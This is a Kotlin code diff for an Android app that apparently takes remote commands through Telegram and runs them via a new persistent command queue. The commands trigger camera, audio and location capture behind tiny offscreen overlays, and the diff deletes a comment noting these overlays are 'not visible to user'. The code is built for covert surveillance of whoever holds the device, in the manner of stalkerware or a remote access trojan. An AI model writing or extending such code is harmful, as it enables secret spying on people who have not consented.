@@ -9,8 +9,24 @@ import android.util.Log
 import android.view.SurfaceHolder
 import android.view.View
 import androidx.core.content.ContextCompat
+import kotlinx.coroutines.CompletableDeferred
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.withContext
 import org.json.JSONObject
 
+data class QueuedCommand(
+    val type: String,
+    val camera: String? = null,
+    val flash: String? = null,
+    val quality: String? = null,
+    val duration: String? = null,
+    val chatId: String? = null
+)
+
+/**
+ * ActionHandlers only enqueues commands;
+ * all actual execution happens through CommandQueueManager.
+ */
 object ActionHandlers {
     fun dispatch(
         context: Context,
@@ -21,7 +37,8 @@ object ActionHandlers {
         duration: String? = null,
         chatId: String? = null
     ) {
-        Log.d("ActionHandlers", "Dispatching type=$type camera=$camera flash=$flash quality=$quality duration=$duration chatId=$chatId")
+        // Initialize CommandQueueManager
+        CommandQueueManager.initialize(context)
 
         val deviceNickname = Preferences.getNickname(context) ?: "Device"
         if (!chatId.isNullOrBlank()) {
@@ -29,6 +46,22 @@ object ActionHandlers {
             UploadManager.init(context)
             UploadManager.sendTelegramMessage(chatId, ackMsg)
         }
+
+        // Enqueue the command for persistent, resource-aware execution
+        CommandQueueManager.enqueue(
+            QueuedCommand(
+                type, camera, flash, quality, duration, chatId
+            )
+        )
+    }
+
+    /**
+     * Executes a remote command.
+     * This is called only by the CommandQueueManager, never directly.
+     */
+    suspend fun executeCommand(context: Context, command: QueuedCommand) {
+        val (type, camera, flash, quality, duration, chatId) = command
+        val deviceNickname = Preferences.getNickname(context) ?: "Device"
 
         if (!checkPermissions(context, type)) {
             Log.e("ActionHandlers", "Required permissions not granted for $type")
@@ -53,7 +86,7 @@ object ActionHandlers {
                     )
                     return
                 }
-                // Use user-friendly overlay: tiny and offscreen by default
+                val deferred = CompletableDeferred<Unit>()
                 OverlayHelper.showSurfaceOverlay(
                     context,
                     callback = { surfaceHolder, overlayView ->
@@ -68,29 +101,36 @@ object ActionHandlers {
                             surfaceHolder,
                             overlayView
                         )
+                        deferred.complete(Unit)
                     },
-                    overlaySizeDp = 64, // tiny preview
-                    offScreen = true // not visible to user
+                    overlaySizeDp = 64,
+                    offScreen = true
                 )
+                deferred.await()
                 return
             } else {
                 if (OverlayHelper.hasOverlayPermission(context)) {
+                    val deferred = CompletableDeferred<Unit>()
                     OverlayHelper.showViewOverlay(context, callback = { overlayView ->
                         if (overlayView == null) {
                             Log.e("ActionHandlers", "Audio/location overlay creation failed.")
+                            deferred.complete(Unit)
                             return@showViewOverlay
                         }
                         Handler(Looper.getMainLooper()).postDelayed({
                             OverlayHelper.removeOverlay(context, overlayView)
                             startOtherActionInvoke(context, type, duration, chatId)
+                            deferred.complete(Unit)
                         }, 400)
                     }, overlaySizeDp = 64, offScreen = true)
+                    deferred.await()
                     return
                 }
             }
         } else {
             startCameraActionInvoke(context, type, camera, flash, quality, duration, chatId)
         }
+        startOtherActionInvoke(context, type, duration, chatId)
     }
 
     private fun startCameraActionInvoke(
